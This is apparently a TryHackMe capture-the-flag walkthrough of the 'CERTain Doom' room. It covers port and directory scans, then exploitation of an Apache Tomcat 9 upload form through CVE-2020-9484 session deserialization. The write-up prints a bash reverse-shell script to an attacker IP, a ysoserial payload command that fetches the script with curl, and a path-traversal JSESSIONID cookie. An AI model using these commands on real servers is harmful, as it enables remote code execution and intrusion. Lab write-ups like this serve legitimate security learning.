<h1 align="center">CERTain Doom</h1>
<p align="center">2025, August 27<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>476</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Bob has since joined the CERT team and developed a nifty new site. Is there more than meets the eye</em>?<br>
<img width="80px" src="https://github.com/user-attachments/assets/7c079b1a-7fa9-4ade-9565-1f55cda42c48"><br>
Access this hard-level CTF clicking <a href="https://tryhackme.com/room/certaindoom">here </a>.<br>
<img width="1200px" src=""></p>

<br>

<p = align="cernter"><code>nmap</code>  .  <code>gobuster</code>  .  </p>

<br>


<h2>Task 1 . Deploy the VM</h2>
<p><code>Bob</code>´s finally joined the <code>CERT team</code> and has created a new front page. Surely nothing can go wrong.<br>



(Please give a few minutes for the VM to boot properly)</p>

<p><em>Answer the question below</em></p>

<p>1.1. I've started the VM and waited a few minutes for it to boot.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Flags</h2>
<p>There's no way in, or is there?</p>

<p><em>Answer the questions below</em></p>

<p>2.1. What is the web flag? Hint : Today's lucky number is 11<br>
<code>________________________________</code></p>

<br>

<p>2.2. What is the user's flag?<br>
<code>________________________________</code></p>

<br>

<p>2.3. What is the super secret flag? Hint : supersonic subatomic<br>
<code>________________________________</code></p>

<br>

<h3>Nmap</h3>

<p>

- <code>&nbsp;&nbsp;22</code> &nbsp; : &nbsp; <code>ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code> &nbsp; : &nbsp; <code>OpenSSH 8.0</code><br>
- <code>&nbsp;&nbsp;80</code> &nbsp; : &nbsp; <code>http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code> &nbsp; : &nbsp; <code>hastatic-1.0.0</code> : <code>https://admin.certain-doom.thm</code><br>
- <code>8080</code>           &nbsp; : &nbsp; <code>http-proxy</code> &nbsp; :  &nbsp; <code>Apache Tomcat 9</code></p>

```bash
:~/CERTainDoom# nmap -sC -sV -Pn -n -p- -T4 xx.xxx.xxx.xxx
...
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open   http       hastatic-1.0.0
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Length: 117674
|     Accept-Ranges: bytes
|     Date: Sun, 27 Aug 2025 xx:xx:xx GMT
|     Server: hastatic-1.0.0
|     Content-Type: text/html
|     Cache-Control: no-transform,public,max-age=300,s-maxage=900
|     Last-Modified: Thu, 26-Jan-2023 xx:xx:xx UTC
|     ETag: 98eb1c6fb079742e0b8682cb642c5c777329ebbe
|     Vary: Accept-Encoding
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     <!doctype html>
|     <html class="no-js" lang="">
|     <head>
|     <meta charset="utf-8">
|     <title>Super Secret Admin Page</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta property="og:title" content="Hydra's Super Secret Admin Page">
|     <meta property="og:type" content="website">
|     <meta property="og:url" content="https://admin.certain-doom.thm">
|_    <meta property="og:image" content="">
|_http-server-header: hastatic-1.0.0
|_http-title: Super Secret Admin Page
8080/tcp open   http-proxy Apache Tomcat 9?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Sun, 27 Aug 2025 xx:xx:xx GMT
|     Connection: close
|     Server: Apache Tomcat 9?
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 27 Aug 2025 12:57:17 GMT
|     Connection: close
|     Server: Apache Tomcat 9?
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-server-header: Apache Tomcat 9?
|_http-title: HTTP Status 404 \xE2\x80\x93 Not Found
9090/tcp closed zeus-admin
```

<h2>Gobuster</h2>

```bash
:~/CERTainDoom# gobuster -u http://xx.xxx.xxx.xxx -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
...
...
```

<h2>Web 80</h2>

<p>

- <code>https://admin.certain-doom.thm</code><br>
- <code>url=https://youtu.be/dQw4w9WgXcQ"</code></p>

<img width="1115" height="533" alt="image" src="https://github.com/user-attachments/assets/000df80a-1016-48a1-abe0-ef2e4123cf61" />

<img width="1108" height="673" alt="image" src="https://github.com/user-attachments/assets/b545411a-8e2c-4399-b7b7-0818b9d17660" />

<br>
<p>

- was redirected to YouTube</p>

<img width="773" height="92" alt="image" src="https://github.com/user-attachments/assets/7642d128-1d9b-44cd-a56c-93dd58a1803a" />

<br>
<h2>Web 8080</h2>

<img width="1126" height="47" alt="image" src="https://github.com/user-attachments/assets/ee378940-4a9b-478f-80e8-6b61c10e5791" />

<br>
<h2>ffuf</h2>
<p>

- /reports</p>

```bash
:~/CERTainDoom# ffuf -u http://xx.xxx.xxx.xxx:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
reports                 [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

<h2>Web 8080/reports</h2>
<p>

- Internal Information Security team = Hydra´s Head CERT<br>
- Company = Hydra´s Head COnsulting Girm<br>
- <code>File Upload Form</code> to browse and upload vulnerabilities in PDF format<br>
- upload a <code>Test.txt</code> containing <code>Hello</code><br>
- used <code>Burp Suite</code> with <code>Foxy Proxy</code> to intercept it<br>
- sent the <code>Request</code> to Burp´s <code>Repater<br>


<div align="center"><h6>

|Request                                                                                      |Response                                                                 |
|:--------------------------------------------------------------------------------------------|:--------------------------------------------------------------------------------------------|
|POST /reports/upload HTTP/1.1<br>
Host: xx.xxx.xxx.xx:8080<br>
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br>
Accetp: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Accep-Encoding: gzip, deflate, br<br>
Content-Type: multipart/form-data;<br>
boundary=---...<br>
Content-Length: 21<br>
Origin: http://xx.xxx.xxx.xx::8080<br>
Connection: keep-alive<br>
Referer: http://xx.xxx.xxx.xx::8080/reports/<br>
Cookie: JSESSIONID=...<br>
Upgrade-Insecure-Requests: 1<br>
<br>
---...<br>
Content-DIsposition: form-data; name="uploadFile"; filename="Test.txt"<br>
Content-Type: text/plain<br>
<br>
worked<br>
<br>
-------27.....<br>|
HTTP/1.1 200<br>
Content-Type: text/html;charset=UTF-8<br>
Content-Length: 340<br>
Date: xxx<br>
Keep-Alive: timeout=20<br>
Connection: keep-alive<br>
Server: Apache Tomcat 9?

<!DOCTYPE html PUBLIC ......<br>
<html><br>
<br>
  <head><br>
    <meta ....<br>
    </title><br>
       Upload Result<br>
    </title<br>  
  </head><br>
<br>
  <body><br>
    <h2><br>
      File /usr/local/tomvat/temp/uploads/Test.txt has uploaded successfulle!<br>
    </h2><br>
  </body><br>
</html><br>
  
</body><br>|



</h6></div><br>


</p>

<img width="1125" height="669" alt="image" src="https://github.com/user-attachments/assets/17f8ce23-5b8f-444c-8b23-ceaf35f26622" />

<br>

<img width="1111" height="134" alt="image" src="https://github.com/user-attachments/assets/603d6a03-160b-44c5-ab28-529266a19350" />

<br>

<h2>Tomcat 9 : Remote Code Execution Exploit</code></h2>

<p>

- <code>https://nvd.nist.gov/vuln/detail/cve-2020-9484</code><br>
- <code>https://github.com/PenTestical/CVE-2020-9484</code></p>

<img width="1875" height="833" alt="image" src="https://github.com/user-attachments/assets/6f5841f9-6eb2-4a35-bf07-e45af8d3df92" />

<br>

<img width="1821" height="872" alt="image" src="https://github.com/user-attachments/assets/335a63a5-ff4c-4a6c-b74b-7a63bf3fe440" />

<br>
<br>ysoserial


```bash
:~/CERTainDoom# cd /opt && git clone https://github.com/frohoff/ysoserial
```

```bash
:/opt/ysoserial# cd /opt && git clone https://github.com/PenTestical/CVE-2020-9484 && cd CVE-2020-9484/ && chmod +x CVE-2020-9484.sh
```

```bash
/opt/CVE-2020-9484# ./CVE-2020-9484.sh --help

usage: ./CVE-2020-9484.sh target-ip

Please start a web listener in /tmp folder:
python3 -m http.server 80

and start your netcat listener at port 4444:
nc -nvlp 4444
```

<br>
<h2>rev.sh</h2>

```bash
:/opt/CVE-2020-9484# cat rev.sh
/bin/bash -i >& /dev/tcp/xx.xxx.xx.xx/443 0>&1
```


<h2>Burp Suite and FoxyProxy<br>
<p>

- launched <code>Burp Suite</code><br>
- enabled <code>FoxyProxy</code></p>

```bash
/opt/CVE-2020-9484/ysoserial/target# java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 'curl xx.xxx.xxx.xxx -o /tmp/rev.sh' > payload.session
```

<img width="1098" height="87" alt="image" src="https://github.com/user-attachments/assets/009b12ae-bbc6-4a3b-a140-3c47a0b6bfc7" />

<br>

<p>

- <code>/usr/local/tomcat/temp/uploads/payload.session</code></p>

<img width="1128" height="79" alt="image" src="https://github.com/user-attachments/assets/6f184779-6b6b-458a-83d9-47a3c2face6e" />


<br>

<p>

- Cookie : JSESSIONID = F2565013911053060744B8011C1E1DD4<br></p>

```bash
Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/payload.session
```
<br>

<img width="1134" height="429" alt="image" src="https://github.com/user-attachments/assets/dd7c608f-4ad6-4f0f-b69c-981da39a2e0b" />


